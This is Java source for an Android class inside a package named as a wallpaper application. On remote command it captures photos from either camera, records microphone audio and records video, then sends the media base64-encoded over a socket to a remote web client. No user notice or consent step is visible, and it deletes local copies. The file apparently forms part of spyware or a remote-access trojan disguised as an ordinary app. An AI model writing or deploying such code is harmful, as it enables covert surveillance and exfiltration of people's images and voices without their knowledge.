package com.example.wallpaperapplication;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.Locale;

import io.socket.client.Socket;

/**
 * CaptureManager — on-demand Camera2 + MediaRecorder capture helper.
 *
 * FIX Bug 9  — CameraDevice was never closed after captureImage().
 *              Now closed in the ImageAvailableListener after encoding.
 *
 * All emits go via the shared StreamingService socket (never a separate socket).
 */
public class CaptureManager {

    private static final String TAG = "CaptureManager";

    private final Context       ctx;
    private final String        deviceId;
    private       Socket        socket;        // injected / updated by StreamingService
    private       String        webClientId;   // target for media-captured

    private HandlerThread bgThread;
    private Handler       bgHandler;

    // Refs held only during an active capture to allow proper cleanup
    private CameraDevice       activeCameraDevice;
    private CameraCaptureSession activeSession;
    private MediaRecorder       activeRecorder;

    public CaptureManager(Context ctx, String deviceId) {
        this.ctx      = ctx.getApplicationContext();
        this.deviceId = deviceId;
        startBackgroundThread();
    }

    /** Called by StreamingService whenever its socket reference changes. */
    public void setSocket(Socket socket, String webClientId) {
        this.socket      = socket;
        this.webClientId = webClientId;
    }

    // =========================================================================
    // IMAGE CAPTURE
    // =========================================================================

    @SuppressLint("MissingPermission")
    public void captureImage(String cameraFacing) {
        bgHandler.post(() -> {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) return;
            String cameraId = findCamera(cm, cameraFacing);
            if (cameraId == null) { Log.w(TAG, "No camera for facing: " + cameraFacing); return; }

            ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
            try {
                cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        activeCameraDevice = camera;
                        try {
                            reader.setOnImageAvailableListener(imgReader -> {
                                Image image = imgReader.acquireLatestImage();
                                if (image == null) return;
                                try {
                                    ByteBuffer buf   = image.getPlanes()[0].getBuffer();
                                    byte[]     bytes = new byte[buf.remaining()];
                                    buf.get(bytes);
                                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                                    emitMedia(b64, "image",
                                            "capture_" + timestamp() + ".jpg",
                                            "image/jpeg");
                                } finally {
                                    image.close();
                                    imgReader.close();
                                    // FIX Bug 9: always close camera after capture
                                    closeCamera();
                                }
                            }, bgHandler);

                            camera.createCaptureSession(
                                    Collections.singletonList(reader.getSurface()),
                                    new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(@NonNull CameraCaptureSession session) {
                                            activeSession = session;
                                            try {
                                                CaptureRequest.Builder b =
                                                        camera.createCaptureRequest(
                                                                CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                b.addTarget(reader.getSurface());
                                                b.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
                                                session.capture(b.build(), null, bgHandler);
                                            } catch (CameraAccessException e) {
                                                Log.e(TAG, "Capture request failed", e);
                                                closeCamera();
                                            }
                                        }
                                        @Override
                                        public void onConfigureFailed(@NonNull CameraCaptureSession s) {
                                            Log.e(TAG, "Session configure failed");
                                            closeCamera();
                                        }
                                    }, bgHandler);
                        } catch (CameraAccessException e) {
                            Log.e(TAG, "createCaptureSession failed", e);
                            closeCamera();
                        }
                    }
                    @Override public void onDisconnected(@NonNull CameraDevice c) { closeCamera(); }
                    @Override public void onError(@NonNull CameraDevice c, int err) {
                        Log.e(TAG, "Camera error " + err); closeCamera();
                    }
                }, bgHandler);
            } catch (CameraAccessException e) {
                Log.e(TAG, "openCamera failed", e);
            }
        });
    }

    // =========================================================================
    // AUDIO CAPTURE
    // =========================================================================

    public void captureAudio(int durationSeconds) {
        bgHandler.post(() -> {
            File outFile = new File(ctx.getCacheDir(),
                    "audio_" + timestamp() + ".m4a");
            MediaRecorder recorder = createRecorder();
            try {
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setAudioSamplingRate(44100);
                recorder.setAudioEncodingBitRate(128000);
                recorder.setMaxDuration(durationSeconds * 1000);
                recorder.setOutputFile(outFile.getAbsolutePath());
                recorder.setOnInfoListener((mr, what, extra) -> {
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stopAndEmitFile(mr, outFile, "audio", "audio/mp4");
                    }
                });
                recorder.prepare();
                recorder.start();
                activeRecorder = recorder;
            } catch (IOException e) {
                Log.e(TAG, "Audio capture setup failed", e);
                recorder.release();
            }
        });
    }

    // =========================================================================
    // VIDEO CAPTURE
    // =========================================================================

    @SuppressLint("MissingPermission")
    public void captureVideo(int durationSeconds, String cameraFacing) {
        bgHandler.post(() -> {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) return;
            String cameraId = findCamera(cm, cameraFacing);
            if (cameraId == null) { Log.w(TAG, "No camera: " + cameraFacing); return; }

            File outFile = new File(ctx.getCacheDir(),
                    "video_" + timestamp() + ".mp4");
            MediaRecorder recorder = createRecorder();
            try {
                recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setVideoSize(1280, 720);
                recorder.setVideoFrameRate(30);
                recorder.setVideoEncodingBitRate(3_000_000);
                recorder.setAudioSamplingRate(44100);
                recorder.setAudioEncodingBitRate(128000);
                recorder.setMaxDuration(durationSeconds * 1000);
                recorder.setOutputFile(outFile.getAbsolutePath());
                recorder.setOnInfoListener((mr, what, extra) -> {
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stopAndEmitFile(mr, outFile, "video", "video/mp4");
                        closeCamera();
                    }
                });
                recorder.prepare();

                cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        activeCameraDevice = camera;
                        try {
                            camera.createCaptureSession(
                                    Collections.singletonList(recorder.getSurface()),
                                    new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(@NonNull CameraCaptureSession session) {
                                            activeSession = session;
                                            try {
                                                CaptureRequest.Builder b =
                                                        camera.createCaptureRequest(
                                                                CameraDevice.TEMPLATE_RECORD);
                                                b.addTarget(recorder.getSurface());
                                                session.setRepeatingRequest(b.build(), null, bgHandler);
                                                recorder.start();
                                                activeRecorder = recorder;
                                            } catch (CameraAccessException e) {
                                                Log.e(TAG, "Video record request failed", e);
                                                closeCamera();
                                            }
                                        }
                                        @Override
                                        public void onConfigureFailed(@NonNull CameraCaptureSession s) {
                                            Log.e(TAG, "Video session configure failed");
                                            closeCamera();
                                        }
                                    }, bgHandler);
                        } catch (CameraAccessException e) {
                            Log.e(TAG, "Video session failed", e);
                            closeCamera();
                        }
                    }
                    @Override public void onDisconnected(@NonNull CameraDevice c) { closeCamera(); }
                    @Override public void onError(@NonNull CameraDevice c, int err) {
                        Log.e(TAG, "Camera error " + err); closeCamera();
                    }
                }, bgHandler);
            } catch (Exception e) {
                Log.e(TAG, "Video capture setup failed", e);
                recorder.release();
            }
        });
    }

    // =========================================================================
    // PRIVATE HELPERS
    // =========================================================================

    /** Safely stop recorder, read file, emit, delete. FIX Bug 9 close included for image path. */
    private void stopAndEmitFile(MediaRecorder recorder, File file, String type, String mime) {
        try {
            recorder.stop();
        } catch (Exception ignored) {}
        recorder.release();
        activeRecorder = null;
        sendFile(file, type, mime);
    }

    private void sendFile(File file, String type, String mime) {
        if (!file.exists() || file.length() == 0) {
            Log.w(TAG, "Empty or missing file: " + file.getName());
            return;
        }
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] bytes = new byte[(int) file.length()];
            //noinspection ResultOfMethodCallIgnored
            fis.read(bytes);
            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
            emitMedia(b64, type, file.getName(), mime);
        } catch (IOException e) {
            Log.e(TAG, "Failed to read file", e);
        } finally {
            //noinspection ResultOfMethodCallIgnored
            file.delete();
        }
    }

    private void emitMedia(String b64, String type, String filename, String mime) {
        Socket s = socket;
        if (s == null || !s.connected()) {
            Log.w(TAG, "Socket not connected — dropping " + type + " capture");
            return;
        }
        try {
            JSONObject payload = new JSONObject();
            payload.put("deviceId", deviceId);
            payload.put("type",     type);
            payload.put("filename", filename);
            payload.put("mimeType", mime);
            payload.put("base64",   b64);
            if (webClientId != null) payload.put("to", webClientId);
            s.emit("media-captured", payload);
            Log.d(TAG, "Emitted media-captured: " + filename + " (" + type + ")");
        } catch (JSONException e) {
            Log.e(TAG, "JSON build error", e);
        }
    }

    /** Find camera ID by facing string ("front" or "back"). */
    private String findCamera(CameraManager cm, String facing) {
        int target = "front".equalsIgnoreCase(facing)
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;
        try {
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics c = cm.getCameraCharacteristics(id);
                Integer f = c.get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == target) return id;
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera enumeration failed", e);
        }
        return null;
    }

    /** Close active session + camera — always safe to call. FIX Bug 9. */
    private synchronized void closeCamera() {
        try { if (activeSession != null) { activeSession.close(); activeSession = null; } }
        catch (Exception ignored) {}
        try { if (activeCameraDevice != null) { activeCameraDevice.close(); activeCameraDevice = null; } }
        catch (Exception ignored) {}
    }

    private MediaRecorder createRecorder() {
        return (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
                ? new MediaRecorder(ctx)
                : new MediaRecorder();
    }

    private String timestamp() {
        return new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
    }

    private void startBackgroundThread() {
        bgThread  = new HandlerThread("CaptureThread");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
    }

    /** Release all resources. Call from StreamingService.onDestroy(). */
    public void release() {
        closeCamera();
        if (activeRecorder != null) {
            try { activeRecorder.stop(); } catch (Exception ignored) {}
            activeRecorder.release();
            activeRecorder = null;
        }
        bgThread.quitSafely();
    }
}
